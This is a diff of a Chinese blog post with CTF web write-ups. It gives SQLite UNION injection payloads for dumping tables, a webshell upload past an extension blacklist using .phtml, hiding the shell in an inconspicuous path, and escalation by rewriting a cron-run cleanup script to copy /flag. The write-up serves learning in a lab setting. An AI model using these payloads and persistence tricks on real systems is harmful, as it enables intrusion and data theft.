@@ -16,7 +16,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://aclosure.github.io/images/cover/06.webp">
 <meta property="article:published_time" content="2026-10-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-10-15T00:32:32.108Z">
+<meta property="article:modified_time" content="2026-10-22T13:22:26.644Z">
 <meta property="article:author" content="kur0sia!">
 <meta property="article:tag" content="dev">
 <meta name="twitter:card" content="summary">
@@ -25,7 +25,7 @@
 
 <link rel="icon" href="/images/Ak_char_007_closre_3.png" type="image/png">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"tsctf-j-26 web-write-up","name":"tsctf-j-26 web-write-up | aClosure's奇妙的妙妙据点","description":"笔者看到了萧垣大人发的飞书，信心大增，决定不管怎么样先写几道题再说。","url":"https://aclosure.github.io/2026/10/10/tsctf-j-26/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"https://aclosure.github.io/"},"image":["https://aclosure.github.io/images/cover/06.webp"],"mainEntityOfPage":"https://aclosure.github.io/2026/10/10/tsctf-j-26/","datePublished":"2026-10-09T16:00:00.000Z","dateModified":"2026-10-15T00:32:32.108Z","author":{"@type":"Person","name":"kur0sia!"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"tsctf-j-26 web-write-up","name":"tsctf-j-26 web-write-up | aClosure's奇妙的妙妙据点","description":"笔者看到了萧垣大人发的飞书，信心大增，决定不管怎么样先写几道题再说。","url":"https://aclosure.github.io/2026/10/10/tsctf-j-26/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"https://aclosure.github.io/"},"image":["https://aclosure.github.io/images/cover/06.webp"],"mainEntityOfPage":"https://aclosure.github.io/2026/10/10/tsctf-j-26/","datePublished":"2026-10-09T16:00:00.000Z","dateModified":"2026-10-22T13:22:26.644Z","author":{"@type":"Person","name":"kur0sia!"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
 
 <script>
   (function () {
@@ -603,17 +603,45 @@
 
   <div class="article-content">
     <p>虽然截至早上(10-10)那会，笔者的心情仍然不算好，但是在下午重新尝试了（问了agent）玛德莱娜小蛋糕这道题之后，发现纯粹是自己绕waf试得不全，从而导致自己不能够破开门，心情变好了！（虽然后头的还是不会写😭</p>
+<p>– 本blog已于10-22复盘后更新，pay attention!</p>
 <h2 id="Web">Web</h2>
 <h3 id="T1-好想玩原神">T1-好想玩原神</h3>
-<p>本题毕竟是第一题，看样子应该是web的签到题目，最后考察了一个不太常规的sql注入。<br>
-我们首先拿到这个页面，查看源代码，发现一个注释里有很多能用的用户信息：</p>
+<p>本题毕竟是第一题，看样子应该是web的签到题目，最后考察了一个不太常规的sql注入。</p>
+<h4 id="PART1-信息搜集">PART1 - 信息搜集</h4>
+<p>我们首先拿到这个页面，查看源代码，发现一个注释里有很多能用的用户信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">      login-checklist:</span><br><span class="line">      13874261905 / Windfall2407</span><br><span class="line">      15790348216 / MoraLake731</span><br><span class="line">      18621573940 / Sakura8102</span><br><span class="line">      19960428137 / SeelieRoute5931</span><br><span class="line">      15172846093 / FrostNights86</span><br><span class="line">      ambertrail@qq.com / AmberTrail09</span><br><span class="line">      liyuepost@163.com / LiyuePost27</span><br><span class="line">      opera.ticket@outlook.com / OperaTicket51</span><br><span class="line">      akasha-note@foxmail.com / AkashaNote68</span><br><span class="line">      quest.ledger@gmail.com / QuestLedger34</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 <p>首先尝试随便一个人的信息，登进去看看回显：<br>
 <img src="/images/rt/tsctf-j-26/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-10%20220057.png" alt=""></p>
 <p>可以看到该用户的信息，但是目前还看不出来有什么用。<br>
 但我们注意到源码中给出了前端的<code>app.js</code>，点进去看看：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loginView = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#login-view&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> resultView = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#result-view&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> resultBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#result&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> statusText = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#status&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">requestJson</span>(<span class="params">path, options = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(path, &#123;</span><br><span class="line">    <span class="attr">credentials</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">	<span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,    </span><br><span class="line">    ...options,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span><br><span class="line">  <span class="keyword">if</span> (!res.<span class="property">ok</span> &amp;&amp; data.<span class="property">redirect</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">assign</span>(data.<span class="property">redirect</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!res.<span class="property">ok</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(data.<span class="property">error</span> || <span class="string">&quot;request failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showResult</span>(<span class="params"></span>) &#123;</span><br><span class="line">  loginView.<span class="property">hidden</span> = <span class="literal">true</span>;</span><br><span class="line">  resultView.<span class="property">hidden</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showLogin</span>(<span class="params"></span>) &#123;</span><br><span class="line">  resultView.<span class="property">hidden</span> = <span class="literal">true</span>;</span><br><span class="line">  loginView.<span class="property">hidden</span> = <span class="literal">false</span>;</span><br><span class="line">  resultBox.<span class="property">innerHTML</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  statusText.<span class="property">textContent</span> = <span class="string">&quot;等待登录&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderItems</span>(<span class="params">items</span>) &#123;</span><br><span class="line">  resultBox.<span class="property">innerHTML</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!items.<span class="property">length</span>) &#123;</span><br><span class="line">    resultBox.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;p class=&quot;empty&quot;&gt;没有匹配记录。&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    statusText.<span class="property">textContent</span> = <span class="string">&quot;0 条记录&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> items) &#123;</span><br><span class="line">    <span class="keyword">const</span> card = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;article&quot;</span>);</span><br><span class="line">    card.<span class="property">className</span> = <span class="string">&quot;record-card&quot;</span>;</span><br><span class="line">    card.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;record-main&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;strong&gt;<span class="subst">$&#123;item.phone&#125;</span>&lt;/strong&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;<span class="subst">$&#123;item.traveler&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;record-meta&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;冒险等阶 <span class="subst">$&#123;item.adventure_rank&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;<span class="subst">$&#123;item.server&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    resultBox.<span class="title function_">appendChild</span>(card);</span><br><span class="line">  &#125;</span><br><span class="line">  statusText.<span class="property">textContent</span> = items.<span class="property">length</span> + <span class="string">&quot; 条登录记录&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#login-form&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="title function_">async</span> (event) =&gt; &#123;</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">const</span> form = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.<span class="property">currentTarget</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">requestJson</span>(<span class="string">&quot;/api/login&quot;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">username</span>: form.<span class="title function_">get</span>(<span class="string">&quot;username&quot;</span>),</span><br><span class="line">        <span class="attr">password</span>: form.<span class="title function_">get</span>(<span class="string">&quot;password&quot;</span>),</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="title function_">showResult</span>();</span><br><span class="line">    <span class="title function_">renderItems</span>(data.<span class="property">items</span> || []);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">if</span> (statusText) statusText.<span class="property">textContent</span> = err.<span class="property">message</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#back-login&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="title function_">showLogin</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>起初没有仔细去想，看到<code>&#123;item.traveler&#125;</code> <code>&#123;item.phone&#125;</code>这种，误以为是ssti模板注入。尝试在用户名和密码处输入<code>&#123;&#123;config&#125;&#125;</code>看看信息，发现无果，还被重定向到了原神的官网。<s>用实践证明了ssti的错误</s><br>
+<p>这里的有效信息看来只有用JSON传username和password这一条，暂时不能判断本题指纹喵。继续搜集信息吧！</p>
+<p>打开dirsearch，开始搜索喵：<br>
+<img src="/images/rt/tsctf-j-26/new/sj.png" alt="搜集喵"><br>
+发现robots.txt可以看看提示（那本题用dirsearch看来成<s>滚木</s>了）</p>
+<p>对于robots.txt，有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * Disallow: /api/login </span><br><span class="line"># Ordinary travelers are forwarded to the official launcher. </span><br><span class="line"># The legacy login gateway still renders selected account rows.</span><br></pre></td></tr></table></figure>
+<p>也就是说，对于非刚刚的注释中的账号来说，会出现非常神奇的效果，<s>反正肯定不会是被403再301到什么原什么神的官网的</s>。<br>
+但是这里说render渲染这个词，很容易引起猫猫们的浮想联翩喵，会想到SSTI和sql灌注喵。❤️</p>
+<p>尝试<code>&#123;&#123;7*7&#125;&#125;</code>这样的效果没有结果喵，被正常301去玩原神了喵，所以尝试sql喵❤️❤️</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13874261905</span></span><br><span class="line"><span class="number">111</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>尝试了这样，从抓的包里头看到，会被400 BAD REQUEST掉，还会报<code>OperationalError</code>喵，这个报错查一下就会发现是sqlite的常见报错喵（应该是这会喵，笔者刚刚复现的时候忘记截图了现在确证不了，请猫猫们谅解喵）❤️❤️❤️</p>
+<h4 id="PART2-打点">PART2 - 打点</h4>
+<p>于是尝试先确证一下，顺便看看都能不能回显喵，这里笔者尝试了</p>
+<p><img src="/images/rt/tsctf-j-26/new/version.png" alt="收集指纹喵"></p>
+<p>也就是<code>111' UNION SELECT 1,sqlite_version(),3,4'</code>喵。成功确认了sqlite的事实，level up了！</p>
+<p>那么接下来就要开始进行老几项了喵：</p>
+<ol>
+<li>确定order数：password位：<code>111' UNION SELECT 1,2,3,4'</code>，需要注意这里两个参数都需要带上引号；</li>
+<li>表名（sqlite不能爆database()）：<code>111' UNION SELECT name,2,3,4 FROM sqlite_master'</code>，得到的表里有一个叫secret_flags的，大概就是它了；</li>
+<li>列名：<code>111' UNION SELECT sql,2,3,4 FROM sqlite_master'</code>,或者<code>' UNION SELECT 1, name, 3, 4 FROM pragma_table_info('secret_flags')</code>。此时注意到**（对于前一种）**：<code>CREATE TABLE secret_flags(id, flag_value, note)</code>，因此flag应该就在flag_value这个列里喵。</li>
+<li>flag：<code>111' UNION SELECT flag_value,2,3,4 FROM secret_flags'</code>即可。</li>
+</ol>
+<p><img src="/images/rt/tsctf-j-26/new/1.png" alt="步骤截图1喵"><br>
+<img src="/images/rt/tsctf-j-26/new/2.png" alt="步骤截图2喵"><br>
+<img src="/images/rt/tsctf-j-26/new/3.png" alt="步骤截图3喵"></p>
+<p>得到flag<code>TSCTF-J&#123;Y@u_c4N_9l4|_G3n5he^!&#125;</code>了！</p>
+<details class="flatpaper-note flatpaper-note--primary"><summary class="flatpaper-note__title"><span class="flatpaper-note__icon" aria-hidden="true"></span><span class="flatpaper-note__label">这里是当时笔者的混乱思考链喵，追求真实心态请看这里喵</span><span class="flatpaper-note__chevron" aria-hidden="true"></span></summary><div class="flatpaper-note__body"><p>起初没有仔细去想，看到<code>{item.traveler}</code> <code>{item.phone}</code>这种，误以为是ssti模板注入。尝试在用户名和密码处输入``看看信息，发现无果，还被重定向到了原神的官网。<s>用实践证明了ssti的错误</s><br>
 然后笔者在这里被卡了许久，然后想到应该找找提示，发现了本题存在的robots.txt爬虫文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * Disallow: /api/login </span><br><span class="line"># Ordinary travelers are forwarded to the official launcher. </span><br><span class="line"># The legacy login gateway still renders selected account rows.</span><br></pre></td></tr></table></figure>
 <p>不过这个/api/login显然是不能用来get的，试了一下确实也不支持这个方法，有些不明觉厉。但是我们确证了，非上面注释里名单的人登录，确实会被重定向到genshin的启动器。这时笔者猜想是sql注入，于是尝试如下：</p>
@@ -637,17 +665,48 @@
 <li>表名（sqlite不能爆database()）：<code>111' UNION SELECT name,2,3,4 FROM sqlite_master'</code>，得到的表里有一个叫secret_flags的，大概就是它了；</li>
 <li>列名：<code>111' UNION SELECT sql,2,3,4 FROM sqlite_master'</code>,这里并没有用常规的<code>' UNION SELECT name,NULL FROM pragma_table_info('users')-- -</code>写法来查询列名，自己试了一下，pragma似乎也会被waf，这么看只有看所有的列名了。此时注意到：<code>CREATE TABLE secret_flags(id, flag_value, note)</code>，因此flag应该就在flag_value这个列里。</li>
 <li>flag：<code>111' UNION SELECT flag_value,2,3,4 FROM secret_flags'</code>即可。</li>
+</ol></div></details>
+<p>总结：</p>
+<ol>
+<li>本题利用一个不常见的sqlite数据库，补充了笔者先前只会mysql的可怜境地。且对于这种waf的拦截，可以学习ai的“最小化探针”逐步进行测试。</li>
+<li>从[miso师傅的blog](<a target="_blank" rel="noopener" href="https://miso2233.github.io/2026/10/21/tsctf-j-2026-wp/#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%BD%A2%E5%BC%8F">TSCTF-J 2026 Web 五题 WriteUp - Miso的博客 | Miso Blog</a>)上，可以看到另外一种sql的写法喵，+当空格是需要读者猫猫们注意的喵。</li>
 </ol>
-<p>总结：本题利用一个不常见的sqlite数据库，补充了笔者先前只会mysql的可怜境地。且对于这种waf的拦截，可以学习ai的“最小化探针”逐步进行测试。对于sqlmap，笔者尝试使用却一直返回假阴性，询问ai之后得知是默认测试样例的锅，随后会进行补充学习。</p>
-<p>– 看上去对于sqlmap，第一默认的加空格的载荷会被waf拦截；第二，对于<code>' AND '1'='1</code>和<code>' AND '1'='2</code>都会返回403禁止访问，对于它的布尔判断器会失效。能看出来出题人想让大家学会sql的基本原理。</p>
+<p>– 对于sqlmap，笔者尝试使用却一直返回假阴性，询问ai之后得知是默认测试样例的锅，第一默认的加空格的载荷会被waf拦截；第二，对于<code>' AND '1'='1</code>和<code>' AND '1'='2</code>都会返回403禁止访问，对于它的布尔判断器会失效。能看出来出题人想让大家学会sql的基本原理喵。</p>
 <h3 id="T2-玛德莱娜小蛋糕">T2-玛德莱娜小蛋糕</h3>
-<p>本题的入口就如同标题一样善，是一个典型的文件上传入口。既然只准上传gif，我们就直接做戏做全套：给cmd的木马加一个GIF98a的头，并且把CT改成image/gif，后缀也改成gif——但是这么搞出了事：</p>
-<p>图片马被传成了<code>storage/tmp/da85388effaa.gif</code>，文件名被随机更改，自然也就按.gif解析了。尝试上传.user.ini和.htaccess，结果发现也被随机更名，走不通了（泣</p>
-<p>之后想到，这戏是不是做得太全了，于是在后缀不更改的情况下，笔者尝试上传了木马，发现：<br>
+<h4 id="PART1-信息收集：">PART1 - 信息收集：</h4>
+<p>本题的入口就如同标题一样善，是一个典型的文件上传入口。但是直接开始猛猛灌注很可能被拒绝喵，好猫咪不能够上来就干这种事，要尝试拉好感度牵牵手约约会再解锁特殊cg喵❤️</p>
+<p>使用dirsearch喵：<br>
+<img src="/images/rt/tsctf-j-26/new/sj2.png" alt="应该是这个喵"><br>
+那个storage忽略掉喵，因为笔者忘了截开始的图了，这个是后来做完才截图的喵，总之这里是没什么特别好的路由作为提示喵。</p>
+<h4 id="PART2-打点-2">PART2 - 打点</h4>
+<p>那就直接打点喵。要朝着最弱的地方攻击喵！既然只准上传gif，我们当然希望灌注进去的一切都会被认成php喵：给cmd的木马加一个GIF98a的头，并且把CT改成image/gif，后缀也改成gif——但是看上去这是有代价的喵：</p>
+<p>图片马被传成了<code>storage/tmp/da85388effaa.gif</code>，文件名被随机更改（讲道理，这个默认解析的gif怎么分辨率这么大，<s>都快赶上我这块滚木2.5k屏了喵</s>），自然也就按.gif解析了。尝试上传.user.ini和.htaccess，结果发现也被随机更名，走不通了喵（泣</p>
+<p>代价就在这里了，于是在后缀不更改的情况下，笔者尝试上传了木马喵，发现：<br>
 <code>这个后缀会弄脏茶桌。</code></p>
 <p>看上去php等后缀会被黑名单拦截掉。但是经过尝试，.phtml不会被黑名单拦下，从而成功上传一句话木马。</p>
 <p><img src="/images/rt/tsctf-j-26/Pasted%20image%2020261010232321.png" alt=""></p>
-<p>  我们使用蚁剑进行连接，尝试<code>env</code>（当然是没有flag的），考虑到去年的tsctf，我们先想到利用<code>sudo -l</code>查看能够用sudo运行的命令，结果发现这个后端把sudo都给阉割了。且过了一阵，蚁剑对命令无响应，检查发现是存在tmp下的木马给自动清除了。正当笔者难过于怎么给用户权限—的flag下手时，agent告诉了我们如下信息：</p>
+<h4 id="PART3-立足点建立喵">PART3 - 立足点建立喵</h4>
+<p>上传的一句话木马默认是防止/tmp这个路由下的，很可能会被坏人清除掉喵！所以我们按说要先cp到一个隐蔽点的目录并改名喵！（比如<code>/var/www/html/assets/fonts/.cache.php</code>，探姬是好人喵！）但是笔者猫猫很懒，经过试验没什么问题后，直接手工cp到上一层<code>/storage</code>目录就完事了喵！</p>
+<p>这样我们就建立了一个稳定的立足点。不过也可能会忽视掉上传的马被定时杀掉的情况喵，了解详情可以看下面收起来的思考链喵。</p>
+<p>连接后尝试了env，当然是没有用的喵！😭还是先看看根目录下在干什么吧！</p>
+<p><img src="/images/rt/tsctf-j-26/new/version.png" alt="ls喵，虽然我自己也不知道为什么不用/"><br>
+可以看到flag是仅root有权看的，所以需要我们进行提权喵。</p>
+<h4 id="PART4-提权，权限维持，加上乱打喵（虽然本题不用维持喵）">PART4 - 提权，权限维持，加上乱打喵（虽然本题不用维持喵）</h4>
+<p>首先用<code>find / -xdev -writable -type f 2&gt;/dev/null</code>查看当前用户/用户组可写的文件喵，因为读的反正除了直接的flag，暂时也没有什么好说的喵！</p>
+<p><img src="/images/rt/tsctf-j-26/new/cap1.png" alt="查看可写"><br>
+可以看到这有一个三分钟什么的，又结合temp里的文件被定时清理的现象，考虑计划任务在清理喵！于是看看cron：</p>
+<p><img src="/images/rt/tsctf-j-26/new/cap2.png" alt="查看cron"></p>
+<p>事实上就是查看了两个系统级的cron，也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">ls -la /etc/cron.d</span><br><span class="line">cat &lt;那个让你在意的名字喵&gt;</span><br></pre></td></tr></table></figure>
+<p>所以我们直接<code>cat /opt/teahouse/bin/clean_uploads.sh</code>喵。<br>
+<img src="/images/rt/tsctf-j-26/new/cap3.png" alt="继续查看cron"><br>
+这里头的东西不就是刚刚查到的三分钟文件吗喵！而且用户可读可写喵！有救了喵！<br>
+所以对它进行一些改造，让cron的大手替我们来读flag就好了喵！<br>
+<img src="/images/rt/tsctf-j-26/new/ntr.png" alt="改造喵！"><br>
+看上去挺有精神的，之前就是你杀了我的木马吗？欸嘿嘿嘿嘿嘿……</p>
+<p>开心地等待3min即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;Cr07-In-534Rbh-0f-10sT_6@k3_@7D_fl3g40f2f86&#125;</span><br></pre></td></tr></table></figure>
+<details class="flatpaper-note flatpaper-note--primary"><summary class="flatpaper-note__title"><span class="flatpaper-note__icon" aria-hidden="true"></span><span class="flatpaper-note__label">这里又是当时笔者的混乱思考链喵，追求真实心态请看这里喵</span><span class="flatpaper-note__chevron" aria-hidden="true"></span></summary><div class="flatpaper-note__body"><p>  我们使用蚁剑进行连接，尝试<code>env</code>（当然是没有flag的），考虑到去年的tsctf，我们先想到利用<code>sudo -l</code>查看能够用sudo运行的命令，结果发现这个后端把sudo都给阉割了。且过了一阵，蚁剑对命令无响应，检查发现是存在tmp下的木马给自动清除了。正当笔者难过于怎么给用户权限—的flag下手时，agent告诉了我们如下信息：</p>
 <p><img src="/images/rt/tsctf-j-26/Pasted%20image%2020261010232810.png" alt=""><br>
 <s>我的马被杀了（）</s></p>
 <p>于是我们再次上传木马，手工cp到/storage下，得到了一个稳定的木马连接，但是没有sudo，笔者还是不会提权。</p>
@@ -663,7 +722,7 @@
 得到：<br>
 <code>var/lib/teahouse/cleanup.conf</code>可以写入，且这个会被计划任务（删除tmp目录的那个）执行。</p>
 <p><img src="/images/rt/tsctf-j-26/Pasted%20image%2020261010234953.png" alt=""></p>
-<p>找到计划任务后，我们直接修改它执行的外部文件cleanup.conf，给它加上一行<code>cp /flag /var/www/html/storage/out.txt; chmod 644 /var/www/html/storage/out.txt</code>，等待计划任务执行即可。</p>
+<p>找到计划任务后，我们直接修改它执行的外部文件cleanup.conf，给它加上一行<code>cp /flag /var/www/html/storage/out.txt; chmod 644 /var/www/html/storage/out.txt</code>，等待计划任务执行即可。</p></div></details>
 <p>– 总结：</p>
 <ol>
 <li>文件上传不要为单个后缀名的限制而气馁，可以尝试多个后缀名（如本题.phtml），对于黑名单模式很有用；</li>
@@ -671,14 +730,27 @@
 </ol>
 <h3 id="T3-BandInvite">T3-BandInvite</h3>
 <p>本题最后只通过抓包看到的@vite等请求定位到了CVE-2026-39363这个任意文件读取的漏洞，但是笔者实在不知道那个websocket是怎么用的，先鸽掉😭</p>
+<ul>
+<li>本题很快就会进行更新，会在周末merak跑路关站之前写好的！不然……不然笔者猫就要找出题人要容器喵！</li>
+</ul>
 <h3 id="T4-MinePortrait">T4-MinePortrait</h3>
-<p>本题进去之后是一个登录框。源码并没有什么有效信息，所以我们首先想到看看robots.txt，找找提示：</p>
+<h4 id="PART1-信息搜集-2">PART1 - 信息搜集</h4>
+<p>本题进去之后是一个登录框。源码并没有什么有效信息，所以我们首先想到看看robots.txt，找找提示（事实上也可以dirsearch搜一下，也只有这个robots.txt有些用了喵）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /www.zip</span><br></pre></td></tr></table></figure>
 <p>下载这个www.zip，可以得到<code>login_source.py</code>和<code>old_note.txt</code>两个文件，在前一个文件中包含进入题目的用户名和密码，old_note中则有如下内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># old_note.txt</span><br><span class="line"># Pelican Town workshop internal notes</span><br><span class="line">#</span><br><span class="line"># private media helper:</span><br><span class="line">#   service = 127.0.0.1</span><br><span class="line">#   route = /fetch.php</span><br><span class="line">#   query = url</span><br><span class="line"># flag in flag.txt</span><br><span class="line"># The media helper is only reachable from the workshop network.</span><br><span class="line"># It was kept for legacy artwork imports used by older portrait tools.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># old_note.txt</span><br><span class="line"># Pelican Town workshop internal notes</span><br><span class="line">#</span><br><span class="line"># private media helper:</span><br><span class="line">#   service = 127.0.0.1</span><br><span class="line">#   route = /fetch.php</span><br><span class="line">#   query = url</span><br><span class="line"># flag in flag.txt</span><br><span class="line"># The media helper is only reachable from the workshop network.</span><br><span class="line"># It was kept for legacy artwork imports used by older portrait tools.</span><br></pre></td></tr></table></figure>
 <p>结合网页给的图片上传转换这一操作，以及可选的svg矢量图格式，还有前端的这段js（虽然结合js某种意义上算马后炮…）：</p>
